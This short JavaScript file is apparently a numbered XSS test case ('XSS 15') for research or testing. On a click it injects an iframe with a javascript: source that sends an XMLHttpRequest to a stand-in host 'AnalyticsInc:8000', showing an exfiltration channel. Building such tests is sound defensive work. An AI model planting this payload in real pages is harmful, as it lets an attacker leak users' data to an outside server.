function exfiltrate_key_history() {

    // XSS 15 - iFrame Source + Javascript Directive - No Obfuscation
    // Exfiltrate data using XMLHTTP request
    var script = document.createElement("iframe");
    script.src = 'javascript:Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss15",true);xmlhttp.send(null);\')()';
	document.getElementsByTagName('body')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;